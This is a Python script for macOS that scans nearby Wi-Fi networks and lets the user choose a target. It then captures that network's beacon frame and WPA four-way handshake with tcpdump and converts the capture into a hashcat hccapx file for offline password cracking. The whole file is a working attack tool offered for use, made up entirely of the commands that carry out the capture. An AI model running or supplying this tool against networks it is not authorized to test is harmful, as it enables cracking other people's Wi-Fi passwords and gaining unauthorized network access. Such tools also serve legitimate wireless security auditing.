#!/usr/bin/env python

from __future__ import print_function

# handle python 2.x vs 3.x input/raw_input
try:
   input = raw_input
except NameError:
   pass

from commands import getoutput
from re import search

# path to airport on OSX.
airport = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport'
tcpdump = '/usr/sbin/tcpdump'
mergecap = '/usr/local/bin/mergecap'
cap2hccapx = '/Users/jness/hashcat-utils/src/cap2hccapx.bin'

# interface name
interface = 'en0'


def _scan():
    """
    scan for wireless networks using airport, and return raw output
    """

    return getoutput('{} {} -s'.format(airport, interface))


def scan():
    """
    return a list of dictionaries for each device
    """

    # get raw output from airdrop
    raw = _scan()

    # hold device data in list for easy usage later
    device_list = []

    # split output by newlines
    devices = raw.split('\n')

    # pop off the scan header
    header = devices.pop(0).split()

    # iterate over each device and generate dictionary
    for _device in devices:

        # regex search for our expected device pattern
        pattern = '([\S ]+) ([\w:]{17}) ([-\d]+)\s ([-\d,+]+)\s+ [Y|N]\s+ [\S]+ (.*)'
        s = search(pattern, _device.strip())

        if s:
            device = dict(
                SSID = s.group(1),
                BSSID = s.group(2),
                SIGNAL = s.group(3),
                CHANNEL = s.group(4),
                SECURITY = s.group(5)
            )

            # append the device to our return list
            device_list.append(device)

    # return devices
    return device_list


def disassociate():
    """
    disassociate from any network
    """

    return getoutput('sudo {} {} -z'.format(airport, interface))


def set_channel(channel):
    """
    set arbitrary channel on the card
    """

    return getoutput('sudo {} {} -c{}'.format(airport, interface, channel))


def get_channel():
    """
    check the card's current channel
    """

    return getoutput('sudo {} {} -c'.format(airport, interface))


def display(devices):
    """
    display all access points using pretty layout
    """
    
    layout = '{:<4} {:<12} {:<7} {:<8} {:<20} {}'

    # print out column headers
    print(layout.format('#', 'SECURITY', 'SIGNAL', 'CHANNEL', 'BSSID', 'SSID'))
    print('-' * 80)

    # iterate over each device
    for num, device in enumerate(devices):

        # get short security names
        security = '|'.join([ i.split('(')[0] for i in device['SECURITY'].split() ])

        # pretty print device using layout
        print(layout.format(
                num,
                security,
                device['SIGNAL'],
                device['CHANNEL'],
                device['BSSID'],
                device['SSID']
            )
        )


def select(devices):
    """
    ask the user to select device by device number
    """
    
    # ask user which device to run against
    try:
        device_id = int(input('\nDevice # '))
    except ValueError as e:
        raise ValueError(e)

    # look up device by device_id
    try:
        device = devices[device_id]
    except IndexError as e:
        raise IndexError(e)

    return device


def get_beacon(device):
    """
    use tcpdump to get beacon frame
    """

    print('Sniffing for beacon frame...')
    _filter = 'type mgt subtype beacon and ether src {}'.format(device['BSSID'])
    o = getoutput('sudo {} "{}" -I -c 1 -i {} -w beacon.cap'.format(
        tcpdump, _filter, interface)
    )

    return o


def get_handshake(device):
    """
    use tcpdump to get handshake
    """

    print('Sniffing for handshake...')
    _filter = 'ether proto 0x888e and ether host {}'.format(device['BSSID'])
    o = getoutput('sudo {} "{}" -I -c 4 -U -vvv -i {} -w eapol.cap'.format(
        tcpdump, _filter, interface)
    )

    return o


def combine_caps():
    """
    combine beacon and handshake cap files
    """

    print('Saving to handshake.cap')
    o = getoutput('{} -a -F pcap -w handshake.cap beacon.cap eapol.cap'.format(
        mergecap)
    )

    return o


def create_hashcat():
    """
    combine beacon and handshake cap files
    """

    print('Saving to handshake.hccapx')
    o = getoutput('{} handshake.cap handshake.hccapx'.format(
        cap2hccapx)
    )

    return o


def main():
    """
    main entry
    """

    # perform a airport scan
    devices = scan()

    if not devices:
        raise Exception('no wireless devices found')

    # pretty print devices to user
    display(devices)

    # have user select device
    device = select(devices)

    # some access points have multiple channels,
    # we will select the first one for simplicity
    channel = device['CHANNEL'].split(',')[0]

    # disassociate from any access point
    disassociate()

    # set the wireless card channel
    set_channel(channel)

    # capture beacon to disk
    get_beacon(device)

    # capture handshake to disk
    get_handshake(device)

    # combine cap files
    combine_caps()

    # create hashcat compat file
    create_hashcat()


if __name__ == '__main__':
    main()
